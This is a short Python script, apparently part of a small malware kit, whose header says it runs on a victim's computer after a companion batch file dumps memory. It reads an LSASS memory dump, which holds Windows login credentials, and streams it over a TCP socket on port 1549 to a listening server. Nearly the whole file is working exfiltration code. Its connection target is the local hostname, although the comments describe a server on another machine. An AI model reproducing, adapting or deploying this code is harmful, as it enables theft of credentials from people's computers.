# NAME: z0b0tClient.py
# PURPOSE: Executed on the victims computer to send the dumped file
# PREREQUISITES: The server must be running on another machine on the same network so that the data can be sent
#                Controller.bat must be run first so that the memory is dumped (if this is not run as an executable)
# EXTRA INFO: If the server is not running then this program will not execute
#             I am not liable for any damages done through the use or modification of this program; with that being said, use it at your own risk.

import socket
from sys import exit

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# MAIN METHOD
def main():
	connectToServer()
	sendInfo()
	client.close()
	exit(0)

def connectToServer():
	# get local machine name and port
	host = socket.gethostname()
	port = 1549 # runs on port 1549

	# connection to hostname on the port
	client.connect((host, port))

def sendInfo():
	filename='.\\lsass_76.dmp'  # file name
	f = open(filename,'rb')
	data = f.read(1024)
	while(data):
		client.send(data)
		data = f.read(1024)
	f.close()

main()
